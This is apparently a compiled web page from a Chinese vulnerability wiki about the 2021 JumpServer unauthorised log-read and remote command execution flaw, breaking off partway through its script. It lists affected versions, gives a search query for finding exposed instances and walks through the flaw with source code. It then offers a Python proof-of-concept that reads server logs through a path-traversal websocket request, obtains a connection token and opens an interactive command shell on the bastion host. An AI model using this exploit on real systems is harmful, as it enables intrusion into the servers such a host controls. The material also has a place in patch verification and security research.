import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as p,e as a}from"./app-58e4a7d6.js";const l={},u=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>JumpServer &lt; v2.6.2
JumpServer &lt; v2.5.4
JumpServer &lt; v2.4.5
JumpServer = v1.5.9
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;FIT2CLOUD-JumpServer-堡垒机&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>安装 JumpServer v2.6.1 版本</p>`,8),r={href:"https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip",target:"_blank",rel:"noopener noreferrer"},k=a(`<ul><li>安装注意 配置网络，配置Mysql，配置Redis 选择 n</li></ul><p>等待完成安装执行以下命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> /opt/jumpserver-installer-v2.6.1
./jmsctl.sh start
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,3),d={href:"http://xxx.xxx.xxx.xxxx:8080",target:"_blank",rel:"noopener noreferrer"},v=a(`<p>默认账号密码 amdin:admin</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>进入后台添加配置</p><p><strong>资产管理 --&gt; 系统用户</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101943889.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>资产管理 --&gt; 管理用户</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101943769.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>用户管理 --&gt; 用户列表</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101943018.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>资产管理 --&gt; 资产列表</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101943864.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看一下项目代码提交变动</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101943085.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time
<span class="token keyword">import</span> os
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> json

<span class="token keyword">from</span> common<span class="token punctuation">.</span>utils <span class="token keyword">import</span> get_logger

<span class="token keyword">from</span> <span class="token punctuation">.</span>celery<span class="token punctuation">.</span>utils <span class="token keyword">import</span> get_celery_task_log_path
<span class="token keyword">from</span> channels<span class="token punctuation">.</span>generic<span class="token punctuation">.</span>websocket <span class="token keyword">import</span> JsonWebsocketConsumer

logger <span class="token operator">=</span> get_logger<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">CeleryLogWebsocket</span><span class="token punctuation">(</span>JsonWebsocketConsumer<span class="token punctuation">)</span><span class="token punctuation">:</span>
    disconnected <span class="token operator">=</span> <span class="token boolean">False</span>

    <span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        user <span class="token operator">=</span> self<span class="token punctuation">.</span>scope<span class="token punctuation">[</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> user<span class="token punctuation">.</span>is_authenticated <span class="token keyword">and</span> user<span class="token punctuation">.</span>is_org_admin<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text_data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> bytes_data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>text_data<span class="token punctuation">)</span>
        task_id <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;task&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> task_id<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>handle_task<span class="token punctuation">(</span>task_id<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">wait_util_log_path_exist</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> task_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        log_path <span class="token operator">=</span> get_celery_task_log_path<span class="token punctuation">(</span>task_id<span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>disconnected<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>log_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send_json<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;.&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;task&#39;</span><span class="token punctuation">:</span> task_id<span class="token punctuation">}</span><span class="token punctuation">)</span>
                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>
            self<span class="token punctuation">.</span>send_json<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;\\r\\n&#39;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&#39;Task log path: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>log_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
                task_log_f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>log_path<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> task_log_f
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">None</span>

    <span class="token keyword">def</span> <span class="token function">read_log_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> task_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        task_log_f <span class="token operator">=</span> self<span class="token punctuation">.</span>wait_util_log_path_exist<span class="token punctuation">(</span>task_id<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> task_log_f<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&#39;Task log file is None: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>task_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

        task_end_mark <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>disconnected<span class="token punctuation">:</span>
            data <span class="token operator">=</span> task_log_f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> data<span class="token punctuation">:</span>
                data <span class="token operator">=</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\r\\n&#39;</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send_json<span class="token punctuation">(</span>
                    <span class="token punctuation">{</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">:</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">&#39;ignore&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;task&#39;</span><span class="token punctuation">:</span> task_id<span class="token punctuation">}</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b&#39;succeeded in&#39;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                    task_end_mark<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>task_id<span class="token punctuation">,</span> <span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                    task_end_mark<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>task_end_mark<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
                logger<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&#39;Task log end: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>task_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
        task_log_f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handle_task</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> task_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&quot;Task id: {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>task_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
        thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>read_log_file<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>task_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">disconnect</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> close_code<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>disconnected <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>新版对用户进行了一个判断，可以使用 谷歌插件 WebSocket King 连接上这个websocket 进行日志读取</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101943143.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>比如send这里获取的 Task id ,这里是可以获得一些敏感的信息的</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101944092.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看一下连接Web终端的后端api代码</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101944673.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到这里调用时必须需要 <strong>user asset system_user</strong> 这三个值，再获取一个20秒的 <strong>token</strong></p><p>访问web终端后查看日志的调用</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101944023.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>docker exec -it (jumpserve/core的docker) /bin/bash
cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/?
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101944593.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>assset_id=ee7e7446-6df7-4f60-b551-40a241958451
system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8	
user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到在不同的时间访问这个接口的asset_id等都是一样的，所以只用在 <strong>刚刚的未授权日志读取</strong>里找到想要的这几个值就可以获得 token</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945874.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求获取20s的token</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945185.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>看一下 koko.js 这个前端文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945990.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,32),m={href:"https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go",target:"_blank",rel:"noopener noreferrer"},b=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945914.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里我们就可以通过 获得的token来模拟请求</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945570.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功连接模拟了这个 token 的请求,可以在Network看一下流量是怎么发送的</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945740.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>模拟连接发送和接发数据</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101945777.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里可以看到我们只要模拟了这个发送，返回的数据和web终端是一样的，那我们就可以通过这样的方法来进行命令执行了</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><ul><li><p>✅POC 里包含两个方法，一个是获取日志文件，另一个是命令执行</p></li><li><p>✅日志提取已经过滤了部分API调用的数据，只需要找到那几个值就好了</p></li><li><p>✅命令执行需要从日志中获取敏感数据并写入脚本对应的变量中</p></li><li><p>✅接收数据如果卡住请调整 for i in range(7) 这个位置的 7</p></li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> asyncio
<span class="token keyword">import</span> websockets
<span class="token keyword">import</span> re
<span class="token keyword">from</span> ws4py<span class="token punctuation">.</span>client<span class="token punctuation">.</span>threadedclient <span class="token keyword">import</span> WebSocketClient

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: https://www.o2oxy.cn/                                    \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: JumpServer &lt;= v2.6.1                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式: python3 poc.py                                           \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mCmd         &gt;&gt;&gt; whoami				                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">ws_long</span><span class="token punctuation">(</span>WebSocketClient<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">opened</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        req <span class="token operator">=</span> <span class="token string">&#39;{&quot;task&quot;:&quot;peiqi/../../../../../logs/gunicorn&quot;}&#39;</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>req<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">closed</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> code<span class="token punctuation">,</span> reason<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Closed down:&quot;</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> reason<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">received_message</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># print(resp)</span>
        data <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;/api/v1/perms/asset-permissions/user/validate/?&quot;</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>


<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">send_msg</span><span class="token punctuation">(</span>websocket<span class="token punctuation">,</span> _text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> _text <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;you have enter &quot;exit&quot;, goodbye&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span>reason<span class="token operator">=</span><span class="token string">&quot;user exit&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>_text<span class="token punctuation">)</span>
    recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&#39;&quot;data&quot;:&quot;(.*?)&quot;&#39;</span><span class="token punctuation">,</span> recv_text<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main_logic</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在连接目标: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">async</span> <span class="token keyword">with</span> websockets<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span> <span class="token keyword">as</span> websocket<span class="token punctuation">:</span>
        recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resws <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>recv_text<span class="token punctuation">)</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> resws<span class="token punctuation">[</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 成功获取 ID: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        inittext <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span> <span class="token string">&quot;type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;TERMINAL_INIT&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;data&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;{\\&quot;cols\\&quot;:164,\\&quot;rows\\&quot;:17}&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">await</span> send_msg<span class="token punctuation">(</span>websocket<span class="token punctuation">,</span> inittext<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&#39;&quot;data&quot;:&quot;(.*?)&quot;&#39;</span><span class="token punctuation">,</span> recv_text<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            cmd <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mcmd  &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            cmdtext <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span> <span class="token string">&quot;type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;TERMINAL_DATA&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;data&quot;</span><span class="token punctuation">:</span> cmd <span class="token operator">+</span> <span class="token string">&quot;\\r\\n&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token keyword">await</span> send_msg<span class="token punctuation">(</span>websocket<span class="token punctuation">,</span> cmdtext<span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                recv_text <span class="token operator">=</span> <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&#39;&quot;data&quot;:&quot;(.*?)&quot;&#39;</span><span class="token punctuation">,</span> recv_text<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/api/v1/users/connection-token/?user-only=1&quot;</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    ws_open <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 是否想要提取日志（Y/N） &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> ws_open <span class="token operator">==</span> <span class="token string">&quot;Y&quot;</span> <span class="token keyword">or</span> ws_open <span class="token operator">==</span> <span class="token string">&quot;y&quot;</span><span class="token punctuation">:</span>
                ws <span class="token operator">=</span> target_url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    ws <span class="token operator">=</span> ws_long<span class="token punctuation">(</span><span class="token string">&#39;ws://{}/ws/ops/tasks/log/&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ws<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    ws<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    ws<span class="token punctuation">.</span>run_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
